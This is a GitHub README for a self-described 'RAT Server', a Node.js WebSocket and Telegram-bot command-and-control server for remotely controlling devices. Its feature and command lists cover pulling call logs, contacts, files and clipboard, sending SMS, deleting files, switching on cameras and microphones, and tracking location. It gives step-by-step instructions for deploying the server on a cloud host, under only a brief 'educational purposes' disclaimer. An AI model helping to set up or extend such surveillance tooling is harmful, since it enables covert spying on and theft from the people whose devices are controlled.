# RAT Server 🚀

A WebSocket-based device control server with Telegram Bot integration for remote command execution and file transfers.

## ⚠️ Warning

This application is for **educational purposes only**. Unauthorized access to computer systems is illegal. Use responsibly and legally.

## Features

✅ WebSocket connection for real-time communication
✅ Telegram Bot integration for command dispatch
✅ File upload/download functionality
✅ Location tracking support
✅ Device status monitoring
✅ Multi-client support
✅ Keep-alive mechanism

## Prerequisites

- Node.js 18+ ([Download](https://nodejs.org))
- npm or yarn
- Telegram Bot Token ([Create bot with BotFather](https://t.me/botfather))
- Telegram Chat ID

## Setup Instructions

### 1. Clone Repository

```bash
git clone https://github.com/munna1127/rat_server-.git
cd rat_server-
```

### 2. Install Dependencies

```bash
npm install
```

### 3. Configure Environment Variables

Create a `.env` file in the root directory:

```bash
cp .env.example .env
```

Edit `.env` with your credentials:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
PORT=9000
NODE_ENV=production
```

### 4. Run Locally

```bash
npm start
```

Server will start on `http://localhost:9000`

## Deploy on Render

### Step 1: Push to GitHub

```bash
git add .
git commit -m "Initial commit"
git push origin main
```

### Step 2: Create Render Account

1. Go to [render.com](https://render.com)
2. Sign up with GitHub account
3. Click "New+" → "Web Service"
4. Select your GitHub repository

### Step 3: Configure Service

- **Name**: rat_server
- **Runtime**: Node
- **Build Command**: `npm install`
- **Start Command**: `npm start`

### Step 4: Add Environment Variables

Go to Environment tab and add:

```
TELEGRAM_BOT_TOKEN = your_token
TELEGRAM_CHAT_ID = your_chat_id
PORT = 8080
NODE_ENV = production
```

### Step 5: Deploy

Click "Create Web Service" and Render will automatically deploy!

## API Endpoints

### GET `/`
Health check endpoint

**Response:**
```
Welcome
```

### POST `/sendFile`
Upload file to Telegram

**Body:**
```json
{
  "file": "binary_file_data"
}
```

### POST `/sendText`
Send text message

**Body:**
```json
{
  "text": "Your message here"
}
```

### POST `/sendLocation`
Send location coordinates

**Body:**
```json
{
  "l1": "latitude",
  "l2": "longitude"
}
```

## WebSocket Commands

Clients can send these commands via WebSocket:

- `cl` - Call Log
- `gc` - Get Contacts
- `ss` - Send SMS
- `ia` - Installed Apps
- `dm` - Device Model
- `gf` - Get File/Folder
- `df` - Delete File/Folder
- `cam1` - Main Camera
- `cam2` - Front Camera
- `mi1`, `mi2`, `mi3` - Microphone 1, 2, 3
- `cp` - Clipboard

## Telegram Bot Commands

### `/start`
Initialize bot interaction

### `Status ⚙`
View all connected devices

### `Action ☄`
Select action for connected devices

## Directory Structure

```
rat_server-/
├── server.js           # Main server file
├── package.json        # Dependencies
├── .env.example        # Environment variables template
├── .gitignore          # Git ignore rules
├── Procfile            # Procfile for deployment
├── render.yaml         # Render deployment config
└── README.md           # This file
```

## Troubleshooting

### "Cannot find module 'ws'"

```bash
npm install
```

### Bot not responding

1. Check TELEGRAM_BOT_TOKEN is correct
2. Check TELEGRAM_CHAT_ID is correct
3. Ensure server is running
4. Check logs: `npm start`

### WebSocket connection fails

1. Check firewall settings
2. Ensure PORT environment variable is set
3. Verify client is connecting to correct URL

### Render deployment fails

1. Check all environment variables are set
2. View logs in Render dashboard
3. Ensure package.json has `"start"` script

## Security Considerations

⚠️ **Important:**

- Never commit `.env` file to Git
- Rotate bot tokens regularly
- Use HTTPS in production
- Implement proper authentication
- Rate limit API endpoints
- Validate all user inputs
- Use environment variables for secrets

## Performance Tips

1. **Keep-Alive**: Automatically pings clients every 30 seconds
2. **Connection Pooling**: Manages multiple WebSocket connections efficiently
3. **Timeout Handling**: Auto-disconnects inactive clients
4. **Error Handling**: Gracefully handles connection failures

## License

ISC License - See LICENSE file for details

## Support

For issues and questions:
- GitHub Issues: [GitHub Issues](https://github.com/munna1127/rat_server-/issues)
- Email: maibatatahu1127@gmail.com

## Author

**Munna** - [GitHub Profile](https://github.com/munna1127)

---

**Last Updated**: 2026-05-05
**Version**: 1.0.0
